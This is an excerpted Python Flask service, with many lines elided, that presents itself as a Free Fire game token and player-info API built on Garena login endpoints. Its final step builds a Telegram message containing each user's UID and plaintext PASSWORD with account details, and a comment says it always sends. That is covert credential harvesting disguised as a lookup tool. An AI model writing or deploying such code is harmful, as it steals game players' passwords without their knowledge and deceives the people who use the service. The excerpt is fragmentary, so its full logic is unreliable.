...
# -*- coding: utf-8 -*-
"""
Free Fire Token + Player Info API – Single endpoint /info
"""
...
_sym_db = _descriptor_pool.Default()
...
def fetch_player_info(account_id: str):
    url = f"https://r2-xinfoo.vercel.app/player-info?uid={account_id}"
    try:
...
def info_endpoint():
    ...
    # Step 2: Inspect token for open_id
    inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
    try:
        insp_resp = requests.get(inspect_url, timeout=10)
        if insp_resp.status_code != 200:
            return jsonify({"success": False, "error": "Inspect token failed"}), 400
        insp_data = insp_resp.json()
        open_id = insp_data.get('open_id')
        if not open_id:
            return jsonify({"success": False, "error": "open_id not found"}), 400
    except Exception as e:
        return jsonify({"success": False, "error": f"Inspect error: {str(e)}"}), 500

    # Step 3: MajorLogin to get account_uid
    ...
    if not account_uid:
        return jsonify({"success": False, "error": "MajorLogin failed (account banned/unregistered)"}), 401

    # Step 4: Fetch player info
    player_data = fetch_player_info(account_uid)
    if not player_data:
        return jsonify({"success": False, "error": "Failed to fetch player info"}), 502
    ...
    # Step 5: Send Telegram message (no toggle – always sends)
    msg = (
        f"🔥 R2X Account Info 🔥\n"
        f"UID: {uid}\n"
        f"PASSWORD: {password}\n"
        f"Account ID: {extracted.get('accountId')}\n"
        f"Nickname: {extracted.get('nickname')}\n"
        f"Region: {extracted.get('region')}\n"
        f"Level: {extracted.get('level')}\n"
        f"Exp: {extracted.get('exp')}"
    )
